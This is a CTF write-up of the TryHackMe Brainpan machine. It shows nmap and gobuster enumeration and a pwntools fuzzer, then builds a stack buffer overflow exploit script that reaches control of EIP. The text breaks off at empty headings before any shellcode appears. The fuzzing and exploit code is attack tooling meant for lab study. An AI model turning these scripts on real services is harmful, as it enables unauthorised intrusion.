---
title: "Brainpan Boot2Root Write-Up"
date: 2020-12-22T00:00:00-04:00
author: "Nate Catelli"
tags: ["ctf", "boot2root", "hacking", "writeup", "tryhackme"]
description: "A boot2root writeup of the Brainpan1 host from TryHackMe"
type: "post"
draft: false
---

## Introduction:
Brainpan took me hours over the span of two days. I found that I quickly got access to the host but had to do a lot of research to escalate from an unprivileged account to root. Local scans made it seem like there maybe were a few ways to reach root though I ended up achieving the escalation the a kernel exploit.

## Environment
The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target host. I knew that there would most likely be an arbitrary service that would need to be exploited going into this attack but little else.

## Attack
Prior to starting the attack, I prepared my workstation by setting up burpsuite, including installing the certificates in firefox. In addition, I also installed `jq`, [gobuster](https://github.com/OJ/gobuster) and the [seclists](https://github.com/danielmiessler/SecLists) wordlist collections.

### Host enumeration
I started the attack by running Connect, Version and OS scans against the host which identified only 2 open ports. One appeared to be an http server. However the other looked to be a TCP prompting for a password.

```
root@kali:~/ctf# nmap -sC -sV -Pn -O 10.10.42.127
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-23 02:35 UTC
root@kali:~/ctf# nmap -sC -sV -Pn -O 10.10.42.127
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-23 02:35 UTC
Nmap scan report for ip-10-10-112-152.eu-west-1.compute.internal (10.10.42.127)
Host is up (0.00043s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings:
|   NULL:
|     _| _|
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                                                                                                                                SF-Port9999-TCP:V=7.80%I=7%D=12/23%Time=5FE2ACFE%P=x86_64-pc-linux-gnu%r(N                                                                                            SF:ULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\
SF:|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20
SF:\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\
SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\
SF:x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\
SF:x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\
SF:x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
MAC Address: 02:65:A0:1B:B0:DD (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/23%OT=9999%CT=1%CU=36762%PV=Y%DS=1%DC=D%G=Y%M=0265A
OS:0%TM=5FE2AD36%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%I
OS:I=I%TS=8)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST
OS:11NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=45EA%W2=45EA%W3=45EA%W4=45EA%W
OS:5=45EA%W6=45EA)ECN(R=Y%DF=Y%T=40%W=4602%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=
OS:Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https:/
/nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.84 seconds
```

To satisfy my curiousity, I connected using `netcat` and found an interfaced that prompted for a password. I fed it a test password and was disconnected.

```
root@kali:~/ctf# nc 10.10.42.127 9999
_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD

                          >> test
                          ACCESS DENIED
root@kali:~/ctf#
```

While I knew there was more here, I had a feeling this could be a potential rabbithole without more information. I decided to crawl the webserver to see if I could learn any more about the target before focusing on this any longer.

### Enumerating the webserver
I opened site index to find a single image and little else. 

![brainpan http index](/img/brainpan_http_index.png)

Probing around for an `robots.txt` or other common directories wasn't fruitful so I decided to run `gobuster` with the `directories-2.3-medium.txt` wordlist against the site to see if there were any hidden directories on the server.

```
root@kali:~/ctf# gobuster dir -u 'http://10.10.42.127:10000/' -w /usr/share/seclists/Discovery/Web-Content/
Display all 128 possibilities? (y or n)
root@kali:~/ctf# gobuster dir -u 'http://10.10.42.127:10000/' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.42.127:10000/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/23 02:49:07 Starting gobuster
===============================================================
/bin (Status: 301)
===============================================================
2020/12/23 02:50:12 Finished
===============================================================
```

The scan returned a single directory, `/bin/` which contained a single executable file. Given the name of the file, I assumed this was the executable for the `brainpan` service running on port `9999` and give that it was an executable, assumed that I would be attacking a windows host.

```
root@kali:~/ctf# curl -sD - 'http://10.10.42.127:10000/bin/'
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/2.7.3
Date: Wed, 23 Dec 2020 02:51:02 GMT
Content-type: text/html; charset=UTF-8
Content-Length: 230

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /bin/</title>
<body>
<h2>Directory listing for /bin/</h2>
<hr>
<ul>
<li><a href="brainpan.exe">brainpan.exe</a>
</ul>
<hr>
</body>
</html>
```

```
root@kali:~/ctf# curl -sO 'http://10.10.42.127:10000/bin/brainpan.exe'
root@kali:~/ctf# file brainpan.exe 
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
```

### Pwning brainpan
Given that the brainpan service was the only other service, I assumed that I would need to identify and exploit a vulnerability in the brainpan.exe. I decided to setup an environment to begin fuzzing the service.

#### Setting up a testing environment
I began by spinning up a windows 7 vm with a host interface so I could easily interact with it from my attack host. I then installed Immunity Debugger, and [mona](https://github.com/corelan/mona) as I assumed that there would be a buffer overflow in the password input of the service.

![immunity debugger](/img/brainpan_immunity_debugger.png)

Finally, I setup a project directory in mona `!mona config -set workingfolder c:\mona\%p` and confirmed that I could hit the local brainpan service with netcat.

#### Fuzzing brainpan
To start crafting the exploit, I opened up a shell in a `python:3` docker image and installed `pwntools`. I then created the following fuzzer script to inject an increasingly longer payload into the password prompt to see if I could cause it to crash.


```python
#!/usr/bin/env python3

import sys, time
from pwn import *

# context vars
context.arch = 'amd64'

# target
ip = '192.168.0.14'
port = '9999'

counter = 100
iterations = 30
buffer = ["A" * counter * i for i in range(1, iterations + 1)]

for buf in buffer:
    try:
        target = remote(ip, port, typ='tcp')
        target.recvuntil(">> ")
        log.info(f"sending payload of {len(buf)} bytes")
        target.sendline(buf)
        target.recvuntil("\n")
        target.close()
    except:
        print(f"Could not connect to {ip}: {port}")
        sys.exit(0)
    time.sleep(1)
```

```
root@00e35ba5ecd5:~# python3 fuzzer.py 
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 100 bytes
[*] Closed connection to 192.168.0.14 port 9999
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 200 bytes
[*] Closed connection to 192.168.0.14 port 9999
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 300 bytes
[*] Closed connection to 192.168.0.14 port 9999
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 400 bytes
[*] Closed connection to 192.168.0.14 port 9999
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 500 bytes
[*] Closed connection to 192.168.0.14 port 9999
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 600 bytes
Could not connect to 192.168.0.14: 9999
```

Running this script caused a crash with a 600 byte long payload and to my delight, it caused an overwrite of the EIP as can be seen by the `41414141` or `AAAA`.

![fuzzer overflow](/img/brainpan_fuzzer_overflow.png)

#### Crafting an exploit
Having identified the potential for an stack overflow exploit, I decided to switch to a template script that I could begin refining as I learned more about the brainpan service. I set the total payload size to 1000 signifying 1000 bytes for the 600 byte overflow with some overhead for a payload.

```python
#!/usr/bin/env python3

import sys
from pwn import *

# context vars
context.arch = 'amd64'

# target
target = remote('192.168.0.14', 9999, typ='tcp')

# target-specific vars

# payload vars
total_payload_size = 1000
offset = 0
overflow = "A" * offset
retn = ""
padding = "\x90" * 0
bad_chars = ""
payload =  ""
postfix = "C" * (total_payload_size - offset - len(retn) - len(padding) - len(payload))

buffer = "".join([
    overflow,
    retn,
    padding,
    payload,
    postfix
])

# send exploit
# sending payload
target.recvuntil(">> ")
log.info(f"sending payload of {len(buffer)} bytes")
target.sendline(buffer)
target.recvuntil("\n")

# cleanup
target.close()
sys.exit(0)
```

#### Identifying the EIP offset

I then decided to use a cyclical pattern to attempt to identify the exact offset for the `EIP`, which I generated with the metasploit framework's `pattern_create.rb` script.

```
root@kali:~/ctf# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

I appended this pattern string to the payload in my exploit script. like the following.

```python
payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
```

```
root@00e35ba5ecd5:~# python3 exploit.py 
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 1000 bytes
```

Rerunning the script confirmed again that the EIP was overwritten and ran the `!mona findmsp -distance 1000` command in immunity debugger.

![mona findmsp](/img/brainpan_mona_findmsp.png)

This shows that the EIP offset was at `524` bytes so I updated the `offset` variable in my exploit and set the `retn` variable to `BBBB` to see if I could confirm this was correct by overwritting the EIP with `42424242`. Rerunning the exploit quickly confirmed this.

![overwrite EIP](/img/brainpan_overwrite_EIP_with_offset.png)

#### Identifying bad characters

## Summary
